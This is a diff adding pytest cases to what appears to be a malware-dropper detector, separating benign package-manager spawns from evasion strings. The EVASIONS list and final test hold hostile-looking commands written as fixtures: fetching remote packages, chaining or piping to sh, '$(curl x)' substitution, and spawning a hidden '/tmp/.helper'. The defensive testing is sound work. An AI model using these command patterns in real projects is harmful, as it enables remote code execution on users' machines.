@@ -368,3 +368,53 @@ def test_a_line_with_a_hundred_thousand_matches_does_not_blow_up():
     start = time.perf_counter()
     run(f)
     assert time.perf_counter() - start < 10
+
+
+# ---- package-manager spawns are not "run a downloaded binary" (fresh-sample false positive) ----
+
+BENIGN_PM_SPAWNS = [
+    "let process = await spawn('pnpm next dev')",  # tailwindcss integration test shape
+    "const p = execSync('npm run dev')",
+    "child = spawn('yarn', ['test', '--watch'])",
+    "subprocess.run(['npm', 'run', 'build'], check=True)",
+    "subprocess.Popen('pnpm vite build', shell=True)",
+    'cmd := exec.Command("bun", "run", "dev")',
+]
+
+
+@pytest.mark.parametrize("spawn_line", BENIGN_PM_SPAWNS)
+def test_spawning_a_package_manager_script_with_a_fetch_is_not_a_dropper(spawn_line):
+    path = "integrations/dev.test.ts" if ";" not in spawn_line and "subprocess" not in spawn_line else "tests/dev.py"
+    lines = [spawn_line, "let html = await fetch(url).then((r) => r.text())"]
+    if path.endswith(".py"):
+        lines = [spawn_line, "html = requests.get(url).text"]
+    assert run(file(path, *lines)) == []
+
+
+EVASIONS = [
+    "execSync('npx https://example.invalid/x')",
+    "execSync('npm install https://example.invalid/x.tgz')",
+    "execSync('pnpm dlx some-package')",
+    "execSync('npm exec some-package')",
+    "execSync('npm add some-package')",
+    "execSync(`pnpm ${name}`)",
+    "execSync('npm run build && sh x.sh')",
+    "execSync('npm run build; sh x.sh')",
+    "execSync('pnpm run dev | sh')",
+    "execSync('npm run ./payload')",
+    "execSync('sudo python3 /tmp/x.py')",
+    "execSync('pnpm', ['run', '/tmp/x'])",
+    "execSync('npm run build $(curl x)')",
+]
+
+
+@pytest.mark.parametrize("spawn_line", EVASIONS)
+def test_package_manager_exemption_does_not_cover_these(spawn_line):
+    findings = run(file("src/a.js", spawn_line, "https.get('https://example.invalid/b', cb)"))
+    assert findings and findings[0].severity >= Severity.HIGH
+
+
+def test_a_package_manager_spawn_does_not_hide_a_second_real_spawn():
+    findings = run(file("src/a.js", "spawn('pnpm next dev')", "https.get('https://example.invalid/b', cb)", "spawn('/tmp/.helper')"))
+    assert findings and findings[0].severity >= Severity.HIGH
+    assert findings[0].line == 3
